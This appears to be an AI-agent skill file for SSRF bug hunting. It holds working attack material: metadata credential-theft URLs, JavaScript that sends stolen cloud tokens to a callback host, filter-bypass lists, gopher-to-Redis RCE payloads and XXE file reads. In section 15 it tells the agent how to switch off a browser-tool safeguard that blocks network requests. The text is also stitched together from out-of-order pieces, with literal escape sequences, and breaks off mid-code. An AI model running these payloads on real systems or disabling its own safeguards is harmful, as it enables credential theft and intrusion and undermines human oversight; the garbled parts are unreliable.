---
name: hunt-ssrf
description: "Hunting skill for ssrf vulnerabilities. Built from 15 public bug bounty reports including AWS metadata SSRF (HackerOne $25k Analytics PDF, Shopify Exchange $25k, Capital One 106M-record breach, Dropbox/HelloSign $4,913), GCP metadata SSRF (Snapchat $4k), Azure IMDS SSRF (Azure DevOps $15k chain, ChatGPT Custom Actions MSRC), DNS rebinding SSRF (Concrete CMS, GitLab UrlBlocker), gopher-protocol-to-Redis-RCE (Yahoo Mail $15k), link-preview SSRF (Reddit Matrix $6k), and headless-browser PDF-generator SSRF chains. Use when hunting SSRF on any target — OOB Collaborator confirmation mandatory for blind cases."
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [ssrf, hunt, redteam]
---

## When to Use

Use when the target has any feature that fetches a URL, imports data from a remote source, generates previews/screenshots, processes webhooks, or renders documents. SSRF allows an attacker to make the server itself perform network requests — reaching internal services, cloud metadata endpoints, and otherwise inaccessible infrastructure. Every link-preview, file-import, image-proxy, webhook-registration, PDF-generation, and redirect-following endpoint is a candidate. Highest-value targets: cloud-hosted SaaS, Kubernetes/orchestration platforms, CI/CD systems, and URL-fetching features.

## Crown Jewel Targets

SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes clusters, microservice meshes, internal APIs). Priority targets:

- **Cloud-hosted SaaS products** (GCP metadata at `[REDACTED_IP]` or `metadata.google.internal`, AWS IMDSv1)
- **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
- **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
- **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
- **Dataset/file import pipelines** — anything that fetches remote URLs on behalf of a user
- **Enterprise self-hosted software** (GitHub Enterprise, GitLab) — SSRF frequently chains to RCE via internal services

Payouts are highest when SSRF reaches: cloud credentials → account takeover, internal admin APIs → data exfil, or chains to RCE.

---

## OOB-Or-It-Didn't-Happen Gate (Read First)

**Claims of blind SSRF require an out-of-band (OOB) confirmation. Always. No exceptions.**

OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canarytoken, or any DNS+HTTP receiver you control that confirms the server actually made an outbound network connection on your behalf.

### What is NOT confirmation of SSRF

- The server **echoing your URL back in an error message**. Example: `"The Web application at http://evil.example.com/x could not be found"` — this is the server formatting your input into an error string, NOT making an outbound HTTP request. The error came from string formatting, not from network failure.
- The server returning a different status code for an external URL vs `localhost`. Different error responses can come from URL-scheme validators, not from actual fetching.
- A delayed response when the URL is sent. Delay can come from DNS resolution attempts within the parser, not from completed HTTP fetches.

### What IS confirmation of SSRF

- A DNS lookup for your unique Collaborator subdomain appears in the OOB listener.
- An HTTP request to your Collaborator HTTP endpoint with the server's source IP and User-Agent.
- For SSRF in JavaScript-execution contexts (PDF renderers, headless browsers), a fetch from the server to your callback URL.

### Default workflow

1. **Plant the Collaborator subdomain first** (sub-tag it per sink: `dlsrcurl.<collab>`, `import.<collab>`, etc., so callbacks tell you which sink fired).
2. **Send the request** to the target endpoint.
3. **Wait 30–120 seconds**, then poll the OOB listener.
4. **Only after a confirmed callback** do you claim SSRF.
5. If zero callbacks across all sub-tagged sinks: SSRF claims must be retracted, even if error messages echo URLs.

**Lesson from a authorized engagement:** SharePoint's `/_layouts/15/download.aspx?SourceUrl=` returned 500 with the title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF (server clearly processed the URL). 38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded **zero DNS or HTTP interactions**. The "echo" was client-side error-string formatting; the server never made an outbound HTTP request. The path is actually an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this as SSRF would have been N/A'd at triage.

---

## Attack Surface Signals

### URL Patterns to Hunt
```
/api/*/preview
/api/*/fetch
/api/*/import
/api/*/webhook
/api/*/proxy
/api/*/render
/api/*/link
/api/*/screenshot
/api/*/export
/api/*/validate
?url=
?uri=
?endpoint=
?redirect=
?src=
?source=
?feed=
?host=
?target=
?dest=
?file=
?path=
?callback=
?image=
?load=
?fetch=
```

### JS Patterns (in client-side code)
```javascript
// Look for these in JS bundles
fetch(userInput)
axios.get(params.url)
XMLHttpRequest + variable URL
url: req.body.url
src: params.source
href: query.endpoint
```

### Response Header Signals
```
X-Forwarded-For headers echoed back
Server: internal-service
Via: 1.1 internal-proxy
X-Cache headers revealing internal hostnames
```

### Tech Stack Signals
- **Kubernetes** — any public-facing aggregated API, metrics endpoints
- **GCP** — any service fetching URLs that runs on Compute Engine/GKE
- **Node.js/Python** with URL-fetching libraries (`requests`, `node-fetch`, `axios`)
- **Headless browsers** (Puppeteer, PhantomJS) used for screenshots/PDF — extremely high value
- **XML/DSPL/CSV import features** — XXE-style SSRF vector
- **OAuth/webhook registration** endpoints

---

## Step-by-Step Hunting Methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check all API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.

2. **Set up an out-of-band detection server** using Burp Collaborator, interactsh, or `https://canarytokens.org` — you need a unique per-test DNS/HTTP callback domain.

3. **Send your callback URL as the parameter value first** (blind SSRF check before anything else):
   ```
   url=https://YOUR.interactsh.com/test
   ```
   Confirm the server makes an outbound connection. This proves execution before attempting internal targets.

4. **Test internal cloud metadata endpoints**:
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - AWS: `http://[REDACTED_IP]/latest/meta-data/`
   - Azure: `http://[REDACTED_IP]/metadata/instance`

5. **Test localhost and common internal ports**:
   ```
   http://localhost/
   http://127.0.0.1:8080/
   http://127.0.0.1:6443/  (Kubernetes API)
   http://127.0.0.1:2379/  (etcd)
   http://127.0.0.1:9090/  (Prometheus)
   http://127.0.0.1:9200/  (Elasticsearch)
   ```

6. **Check for redirect-based SSRF** — if the endpoint validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses. Kubernetes report (Report 3) was specifically triggered by hijacked API servers returning 30x responses.

6b. **Timing Oracle — Blind Data Extraction from IMDS** — When SSRF is confirmed but response content is not returned (e.g., WordPress `pingback.ping` faultCode 0), use timing differences to enumerate AWS IAM roles and extract IMDS metadata character-by-character:

   ```python
   import subprocess, time

   def ssrf_time(url):
       xml = f'''<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>
   <params><param><value><string>{url}</string></value></param>
   <param><value><string>https://target.com/</string></value></param>
   </params></methodCall>'''
       start = time.perf_counter()
       subprocess.run(["curl", "-sk", "-X", "POST",
           "https://target.com/xmlrpc.php",
           "-H", "Content-Type: text/xml", "-d", xml],
           capture_output=True, timeout=15)
       return time.perf_counter() - start

   # IMDS response size correlates with timing
   baseline = ssrf_time("http://[REDACTED_IP]/latest/meta-data/")
   # Role exists = JSON payload (slower), 404 = tiny response (faster)
   for role in ["admin","ec2","s3","lambda","ecs","SSM-Role","EC2Role"]:
       t = ssrf_time(f"http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/{role}")
       print(f"  {role}: {t:.3f}s -> {'FOUND' if t > baseline*1.15 else '404'}")
   ```

   **Field evidence (retail.example.com, June 2026):** IMDS `/meta-data/` = 344ms, `/iam/security-credentials/` = 435ms, `/instance-id` = 301ms. Timing varies proportionally to response size — enables blind extraction of IAM roles and metadata content.

   **Pitfall:** Network jitter causes ±50ms variance. Run each test 3 times, use the median. Skip if baseline variance exceeds 20%.

7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers):
   - Inject `<script>` tags that make `XMLHttpRequest` or `fetch()` calls to internal services
   - Exfil via DNS: encode response data in subdomain of your callback domain

8. **Enumerate the internal network** using timing differences and error message variations:
   - Port scan via response time (`connection refused` vs timeout)
   - Check error messages for hostname/IP leakage

9. **Chain findings** — if you have SSRF to internal services, look for:
   - Unauthenticated admin endpoints
   - Redis, memcached (protocol smuggling)
   - Internal OAuth token endpoints
   - SSRF → CSRF → RCE (GitHub Enterprise pattern)

10. **Document the full chain** with screenshots of each hop before reporting.

---

## Payload & Detection Patterns

### Basic Out-of-Band Detection
```bash
# Using interactsh-client
interactsh-client -v

# Test parameter
curl --max-time 30 --connect-timeout 10 -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"

# With common headers that might unlock SSRF
curl --max-time 30 --connect-timeout 10 -s "https://target.com/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://YOUR_ID.oast.pro"}'
```

### Cloud Metadata Payloads
```bash
# GCP - requires Metadata-Flavor header (test if server adds it automatically)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://[REDACTED_IP]/computeMetadata/v1/project/project-id

# AWS IMDSv1 (no auth required)
http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/
http://[REDACTED_IP]/latest/user-data

# Azure
http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01
```

### Localhost/Internal Port Payloads
```bash
# Kubernetes internals
http://127.0.0.1:6443/api/v1/namespaces
http://10.0.0.1:6443/api/v1/secrets
http://127.0.0.1:10250/pods          # kubelet
http://127.0.0.1:2379/v2/keys        # etcd

# Common internal services
http://127.0.0.1:6379/               # Redis (check for inline commands)
http://127.0.0.1:9200/_cat/indices   # Elasticsearch
http://127.0.0.1:5601/               # Kibana
http://127.0.0.1:8500/v1/catalog/services  # Consul
```

### Redirect-Based SSRF (when direct is blocked)
```python
# Simple Python redirect server
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://[REDACTED_IP]/latest/meta-data/')
        self.end_headers()

HTTPServer(('192.0.2.1', 8080), Redirect).serve_forever()
```

### JavaScript-Based SSRF (headless browser contexts)
```javascript
// Exfil via fetch
fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {
  headers: {'Metadata-Flavor': 'Google'}
}).then(r=>r.text()).then(d=>{
  fetch('https://YOUR.callback.com/?d='+btoa(d))
})

// DNS exfil for blind contexts
var x = new XMLHttpRequest();
x.open('GET','http://[REDACTED_IP]/latest/meta-data/');
x.send();
x.onload = function(){
  var img = new Image();
  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';
}
```

### Grep Patterns for Source Code Review
```bash
# Find URL fetch operations
grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"

# Find URL parameters being passed to HTTP clients
grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"

# Find redirect following
grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"
```

### ffuf Parameter Discovery
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \
  -fs 0 -mc all
```

---

## Common Root Causes

1. **"The user said it was safe"** — Developers trust user-supplied URLs for fetching remote resources (link previews, thumbnails, webhooks) without validating the destination. The feature is legitimate; the missing validation is the bug.

2. **Allowlist bypass via redirects** — Developers validate the initial URL against an allowlist but configure HTTP clients to follow redirects automatically. An attacker's server on the allowlist redirects to an internal address.

3. **Aggregated/proxy API trust** — Kubernetes-style architectures where an API aggregation layer blindly proxies 30x responses from registered extension servers. Compromising a single extension server gives SSRF into the core API.

4. **Server-side rendering without sandboxing** — Headless browser features (PDF generation, link preview screenshots) execute attacker-controlled JavaScript in a network-privileged context with access to metadata services.

5. **XML/DSPL/file parsers fetching external entities** — Import features that parse structured files (XML, DSPL, CSV with remote schemas) fetch attacker-controlled URLs, often with no URL validation at all.

6. **Internal hostname leakage via response differences** — Services return different error messages, timing, or response sizes for internal vs. external hosts, enabling blind enumeration even when content isn't returned.

7. **IMDSv1 still enabled** — Cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the `Metadata-Flavor` header (GCP) allow unauthenticated credential access from any SSRF.

---

## Bypass Techniques

### Blocklist Bypasses (When `localhost`, `127.0.0.1`, `169.254.x.x` are blocked)

```
# IPv6 equivalents
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:[REDACTED_IP]]/

# Decimal/octal/hex encoding of IP
http://2130706433/          (127.0.0.1 decimal)
http://0x7f000001/          (127.0.0.1 hex)
http://0177.0.0.1/          (octal)
http://127.1/               (short form)
http://0/                   (resolves to 192.0.2.1)

# DNS rebinding - register a domain that resolves to internal IP after first check
# Use https://lock.cmpxchg8b.com/rebinder.html

# Subdomain pointing to internal IP
http://localtest.me/         (resolves to 127.0.0.1)
http://127.0.0.1.nip.io/
http://customer.attacker.com/ (A record → 192.168.1.1)

# URL parser confusion
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com
http://127.0.0.1%25@evil.com  (URL encoding)
http://evil.com\.127.0.0.1/   (backslash)

# Protocol confusion
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)
sftp://attacker.com:11111/
ldap://127.0.0.1/

# Redirect chain bypass
https://allowlisted-domain.com → HTTP 301 → http://[REDACTED_IP]/

# Case variation / URL encoding
http://Localhost/
http://127.0.0.1%2F@evil.com/
```

### Schema/Protocol Bypasses
```
# When only http/https allowed but implementation is loose
http://[REDACTED_IP]:80@evil.com/
//[REDACTED_IP]/
```

### TOCTOU (Time-of-Check vs Time-of-Use)
- Validate URL → sleep → redirect to internal (race condition with DNS rebinding)
- Register a domain with 0-TTL, rotate DNS between validation and fetch calls

### When Response is Not Returned (Blind SSRF)
- Use DNS-only callbacks (data encoded in subdomain labels)
- Use timing differences for port scanning
- Use different HTTP methods (PUT/DELETE) to trigger distinct behaviors on internal services
- Chain with other bugs that leak response data (e.g., error messages, logs)

---

## MDPsec Verified Patterns (9 real SSRF reports)

Real-world primitives from mdpsec.com reports:

1. **Allowlist at creation-time only (TOCTOU DNS rebinding)** — destination-creation validates IP once; fetch re-resolves without re-validation. Register hostname with two A records (TTL 0): public IP passes creation check, metadata IP wins at fetch. AWS signature: `server: EC2ws` header + ~200ms RTT (13).
2. **302 redirect flips POST→GET to IMDS** — endpoint only sends POST; external redirect service issues 302 → server follows, POST becomes GET against `169.254.169.254` → reflected instance identity doc (104).
3. **Response-body-stored SSRF** — `externalUrl` param fetched server-side, FULL response body stored as downloadable attachment → `GET` attachment = read IMDS credentials (90). Sibling endpoints may expose only binary status — the one that stores bodies is the escalation.
4. **Blind SSRF → status-code oracle** — webhook validator echoes upstream code: `"Invalid response code from webhook url: 404"` vs `"Webhook challenge failed"` → distinguishes 2xx vs non-2xx → map internal services (123). Any error message echoing upstream status = oracle.
5. **Content-type oracle via reflected media.type** — NFT metadata SSRF: backend fetches tokenURI() image/animation_url; vary attacker response content-type → reflected `media.type` flips → proves live server-side fetch + fingerprints services (75).
6. **Credential headers leaked on outbound** — search/dataset provider SSRF: worker signs every outbound request with cloud credential headers (temp access key + session token) → attacker listener receives them (97).
7. **Deep link SSRF with victim bearer auto-attach** — Android deep link fires authenticated API POST with victim's bearer; relative path `Uri.parse(path).getHost() == null` passes allowlist → any authenticated user API endpoint reachable, live GPS appended (94).
8. **Cloud DB SQL functions bypass egress filters** — `CREATE DATABASE ... ENGINE = RemoteCatalog(...) SETTINGS metadata_service='metadata.internal', service_account='default'` → collector receives live Google OAuth2 token; Azure path: `objectStorage()` falls back to pod managed identity → Microsoft Entra token in headers (15).
9. **ImageMagick LFI+SSRF combo** — upload SVG `<image xlink:href="text:/etc//passwd">` → file contents painted into stored photo; same sink fetches URLs server-side and follows redirects → blind SSRF with OOB callbacks from production IPs (54).

Cross-ref `mdpsec-report-knowledge` for the full index.

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you retrieve a response proving internal network access? (Show the metadata token, internal API response, or confirmed DNS callback)
   - If blind: can you demonstrate port differentiation or confirmed OOB callback tied to a specific internal address?
   - "The server makes a request" alone is insufficient — show *where* it goes and *what comes back*.

2. **What does the victim LOSE?**
   - Cloud credentials (IAM tokens) → full cloud account compromise?
   - Internal service data (user PII, secrets, API keys)?
   - Ability to pivot to RCE via internal admin service?
   - If the answer is only "the server fetches my URL," severity is low — quantify the actual reachable blast radius.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint still live and the parameter still present?
   - Does your callback server show the hit reliably (not intermittently)?
   - Can a second person follow your steps without prior knowledge and get the same result?
   - If reproduction requires specific timing, tokens, or luck — resolve the flakiness before submitting.

---

## Real Impact Examples

### Scenario A: Cloud Credential Exfiltration via Link Preview (Snapchat/GCP Pattern)
A public-facing "link preview" API accepted a `url` parameter and fetched the target server-side to generate thumbnail content. The feature ran on GCP Compute Engine with IMDSv1 enabled and no `Metadata-Flavor` header enforcement on the server side. By supplying `url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, the attacker received a valid OAuth2 access token for the instance's service account. The token granted access to internal GCP project resources including storage buckets containing user data. The attacker used JavaScript execution within a headless rendering context to exfiltrate the token via DNS-encoded subdomains, bypassing response body restrictions.

### Scenario B: Kubernetes API Compromise via Hijacked Aggregated Server (Kubernetes Pattern)
An attacker who could register a Kubernetes API extension server (metrics-server equivalent) returned `302 Location: http://127.0.0.1:6443/api/v1/secrets` responses to the aggregation layer. Because the aggregation proxy followed redirects automatically without re-validating the destination against the internal network blocklist, the redirect caused the aggregation layer itself (running with elevated cluster credentials) to fetch internal Kubernetes API secrets and return them in the response. This effectively allowed an attacker with limited API registration privileges to escalate to full cluster secret read access — a critical privilege escalation via SSRF chained through trusted infrastructure components.

---

## Disclosed Report Citations (Backfill +6 — 2018-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Cloud-metadata SSRFs across all three providers, DNS rebinding, gopher-to-Redis-RCE, link-preview SSRF, and headless-browser/PDF-generator chains are all represented.

3. **HackerOne — SSRF in Analytics Reports (PDF generator → AWS metadata)** ([H1 #2262382](https://hackerone.com/reports/2262382) · [Writeup](https://osintteam.blog/25-000-ssrf-in-hackerones-analytics-reports-b9a5b3aa3d6e))
    - Subclass: headless-browser SSRF (PDF generator) → AWS metadata SSRF (IMDSv1)
    - Payload: injected `<iframe src="http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/">` into a template element rendered server-side; backend Ruby loop rendered the untrusted template HTML into PDF, reflecting IMDS response inside the rendered PDF / error message
    - Root cause: unsanitised user-controlled template fragment reflected in PDF rendering pipeline; no IMDSv2 enforcement
    - Year: 2023 — **$25,000** (CVSS 10.0 Critical)

4. **Shopify Exchange — SSRF in screenshot service → GCP metadata → container root** ([H1 #341876](https://hackerone.com/reports/341876))
    - Subclass: GCP metadata SSRF → SSRF-to-RCE chain
    - Payload: created store on partners.shopify.com, edited `password.liquid` template to embed a request to `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`, then triggered the Exchange screenshotting service to render the template server-side
    - Root cause: screenshotter fetched user-controlled template with no metadata-host blocklist and no metadata-concealment proxy
    - Year: 2018 — **$25,000** (canonical headless-browser → metadata)

5. **Concrete CMS — SSRF mitigation bypass via DNS rebinding → AWS IAM keys** ([H1 #1369312](https://hackerone.com/reports/1369312))
    - Subclass: DNS rebinding SSRF → AWS metadata SSRF (IMDSv1)
    - Payload: file-upload-from-URL feature; attacker DNS server alternated `A` records between `[REDACTED_IP]` (public) and `[REDACTED_IP]`; needed 2-3 requests to win the race between validation and fetch; final request retrieved IAM role credentials
    - Root cause: validated hostname by resolving once; download path re-resolved DNS without pinning the validated IP
    - Year: 2021 — fixed in 8.5.7 / 9.0.1

6. **Yahoo Mail — Blind SSRF → Gopher → Redis RCE** ([Writeup](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530))
    - Subclass: gopher protocol abuse → Redis SSRF → SSRF-to-RCE chain
    - Payload: blind SSRF in Yahoo Mail backend reached via `gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall...SET stuff /var/spool/cron/root...BGSAVE` — wrote a cron via Redis to get command execution
    - Root cause: gopher scheme not blocklisted; internal Redis unauthenticated on default port; SSRF target accepted 302 redirect from attacker host to `gopher://`
    - Year: 2020 — **$15,000**

7. **Reddit Matrix — Blind SSRF in `preview_url` API** ([H1 #1960765](https://hackerone.com/reports/1960765))
    - Subclass: link-preview SSRF (blind, internal port-scan via timing/response codes)
    - Payload: `GET https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=http://10.0.0.0:80/` — varied internal IPs/ports; service names and IPs leaked through response differences before the fix
    - Root cause: link-preview fetcher did not reject RFC1918 / link-local destinations; allowlist-by-scheme only
    - Year: 2023 — **$6,000**

8. **Azure DevOps — SSRF in Service Hooks + DNS rebinding bypass in endpointproxy** ([Binary Security writeup](https://www.binarysecurity.no/posts/2025/01/finding-ssrfs-in-devops))
    - Subclass: webhook URL field SSRF + DNS rebinding SSRF → Azure IMDS / managed identity
    - Payload: configured service-hook webhook URL or `endpointproxy` URL parameter to attacker rebinding host; second resolution returned `[REDACTED_IP]`; chained CRLF injection to set required `Metadata: true` header for Azure IMDS
    - Root cause: validation-then-fetch with separate DNS lookups; CRLF in URL path injected headers needed by Azure IMDS
    - Year: 2023-2024 — **$15,000 total** across 3 reports

---

## Verification

Run this self-test to confirm ssrf hunting readiness:

1. **Skill integrity** — confirm the skill file is readable and well-formed:
   ```bash
   grep -q "name: hunt-ssrf" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
   ```

2. **Category check** — confirm the skill has a category:
   ```bash
   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
   ```

3. **Pitfalls section** — confirm pitfalls are documented:
   ```bash
   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
   ```

All 3 tests verify the skill is properly structured and ready for use.

---

## Pitfalls
- **SSRF with DNS-only callback** — DNS pingback from the target server proves SSRF but not impact. Need HTTP response data, cloud metadata access, or internal service interaction.
- **Blind SSRF without confirmation** — sending a request without reading the response is blind SSRF. Demonstrate via Collaborator/OOB callback.
- **SSRF to localhost but no open ports** — reaching 127.0.0.1 proves SSRF. Need to demonstrate access to a useful service (metadata, admin, database).
- **URL validation bypass** — `http://127.0.0.1@evil.com` or `http://0x7f000001` bypasses naive URL parsers. Test multiple bypass techniques.
- **Cloud metadata access** — 192.0.2.1 is the holy grail of SSRF. One IAM credential extraction = Critical.

---

## Related Skills & Chains

- **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`hunt-llm-ai`** — LLMs with fetch_urltools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **`hunt-rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.

### Phase X — Cloud Metadata Catalog

| Provider | Metadata Endpoint |
|---|---|
| AWS IMDSv1 | `http://[REDACTED_IP]/latest/meta-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01` |
| DigitalOcean | `http://[REDACTED_IP]/metadata/v1.json` |
| Alibaba Cloud | `http://[REDACTED_IP]/latest/meta-data/` |

Gopher protocol to Redis/FastCGI RCE:
```
gopher://127.0.0.1:6379/_SET%20crack%20test%0d%0aCONFIG%20SET%20dir%20/var/www/html
```


---

## Content from local version



## Core Insight
The real skill isn't knowing what LFI or SSRF is — it's knowing **how to reach the vulnerable code path**.



## 12. XXE Injection for Local File Read

When a form/endpoint takes POST input and echoes it, try XML Content-Type to exploit XXE:

```bash
curl -sk "https://target.com/page" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
       <!DOCTYPE foo [
         <!ENTITY xxe SYSTEM "file:///next.txt">
       ]>
       <name>&xxe;</name>'
```

**Detection:** The entity value replaces normal output:
- Normal: `Hello test. Can you read '/next.txt'?`
- XXE success: `Hello Bravo! Next level: /ABC123. Can you read '/next.txt'?`

**Target files:** `/next.txt`, `/flag`, `/etc/passwd`, `/var/www/html/index.php`



## 16. Base64 Note Enumeration (CTF Pattern)

When hints mention "mailbox numbers" and "simple code":

```python
import base64, requests
for i in range(1, 500):
    b64 = base64.b64encode(str(i).encode()).decode().rstrip('=')
    r = requests.get(f"{url}?note={b64}")
    if "Note not found" not in r.text:
        print(f"Note {i}: {extract_content(r.text)}")
```

The note number (e.g., 100) may contain the next level path.



## 4. SSRF via URL-Based Features

Find features that fetch external URLs:

```bash
# Map/image/profile URL features
# Change the URL parameter to internal addresses
POST /api/v1/map
{"url": "http://localhost:8080"}

POST /api/v1/profile/image
{"image_url": "http://127.0.0.1:5000"}

POST /api/v1/fetch
{"target": "http://169.254.169.254/latest/meta-data/"}
```

**Test for cloud metadata:**
```bash
# AWS
http://169.254.169.254/latest/meta-data/
# GCP
http://metadata.google.internal/computeMetadata/v1/
# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```



## 10. Webhook SSRF — IP Whitelist Bypass Techniques

When a webhook/SSRF endpoint validates the target IP against a whitelist:

### Technique A — IP Format Variations
```bash
# Skip validation with alternative IP formats:
http://127.1/                   # short IP
http://2130706433/              # decimal
http://0x7f000001/              # hex
http://[::1]/                   # IPv6
http://0/                       # zero
```

### Technique B — DNS Rebinding
If the server validates the IP on save but resolves DNS again on the actual call:

```python
# Services that provide time-based DNS rebinding:
# IP1.IP2.rbndr.us  → alternates between IP1 and IP2 (when queried from different resolvers)
# make-IP1-rebind-IP2-rr.1u.ms  → CONFIRMED DEAD (SERVFAIL from all resolvers)

# Example: first resolves to 8.8.8.8 (passes whitelist),
# then resolves to 127.0.0.1 (webhook call)
```

**⚠️ Pitfall — rbndr.us does NOT randomize from a single DNS resolver:**
- The service ALWAYS returns the same IP per query from the same resolver
- Different resolvers return DIFFERENT IPs for the same domain:
  - Authoritative DNS (`@199.241.29.227`): returns FIRST hex IP
  - Google DNS (`@8.8.8.8`): returns SECOND hex IP
- See `references/dns-rebinding-services.md` for the full resolver matrix and hex IP encoding table

**⚠️ Pitfall — Docker DNS caching blocks rebinding:**\n- Docker's internal DNS (`127.0.0.11`) may CACHE DNS responses even when TTL=0\n- The server may ALWAYS resolve to the same IP (the whitelisted one) regardless of the rebinding service's random selection\n- Symptoms: save always succeeds (whitelist passes), test always times out (same IP resolves)\n- Workarounds:\n  - Wait 30-60 seconds between save and test (Docker min cache may expire)\n  - Use a FRESH HTTP session for each attempt (may force new DNS resolution)\n  - Add random subdomains or query strings to the URL to break cache\n  - Try parameter pollution on test (override saved URL during test request)\n  - **Send save + test in the same POST** (`url=...&test_webhook=1`) — some servers process the save and then immediately test using a new DNS query before the cache has time to settle\n  - **Use HTTPS in the saved URL** (`https://...` instead of `http://...`) — the PHP backend may route the HTTPS request through a different code path or use curl with different DNS resolution behavior

**⚠️ Resolver-specific behavior:** Querying `rbndr.us` from different DNS servers returns DIFFERENT IPs for the same domain. Query from the authoritative server (`@199.241.29.227`) returns the FIRST hex IP; query from Google DNS (`@8.8.8.8`) returns the SECOND hex IP. This means rebinding may work if the server uses multiple DNS resolvers across save vs test.

### Technique C — Open Redirect Chaining
If a domain in the whitelist has an open redirect or proxy:

```bash
http://whitelisted-host/redirect?url=http://127.0.0.1:8000/
```

### Technique D — Parameter Pollution on Test
When saving a whitelisted URL then testing, try adding/crafting parameters:

```bash
# Save whitelisted URL
POST /webhook {"url": "http://8.8.8.8/"}
# → "Webhook saved"

# Test with overridden URL
POST /webhook {"test_webhook": "1", "url": "http://127.0.0.1:8000/"}
```



## 15. Webhook SSRF with IP Whitelist

### Tool Configuration: Enabling Browser Console Network Requests

When Hermes blocks `fetch()` from the browser console with:
```
Blocked: browser_console(expression=...) tried to use sensitive browser JavaScript primitive (network request)
```

Enable unsafe evaluation to allow AJAX/fetch calls:
```bash
hermes config set browser.allow_unsafe_evaluate true
```
Then retry the fetch call. **Disable after the test** for security:
```bash
hermes config set browser.allow_unsafe_evaluate false
```

When a webhook feature validates target IP against a whitelist:

### Flow
1. Save URL → DNS resolve → IP check → save if allowed
2. Test webhook → DNS resolve → HTTP request

### Bypass techniques

**A) DNS Rebinding** — if resolutions happen at different times (save vs test):
```
# IPs are converted to HEX and joined:
# IP1 = 8.8.8.8  → hex 08080808
# IP2 = 127.0.0.1 → hex 7f000001
# Domain: 08080807.7f000001.rbndr.us

# Generator: https://lock.cmpxchg8b.com/rebinder.html
# Services (verify availability first — rbndr.us may be dead):
dig <hex_ip1>.<hex_ip2>.rbndr.us
dig make-<ip1>-rebind-<ip2>-rr.1u.ms
```

**Hex conversion:**
```python
def ip_to_hex(ip):
    return ''.join(f'{int(o):02x}' for o in ip.split('.'))
# 8.8.8.8 → 08080808
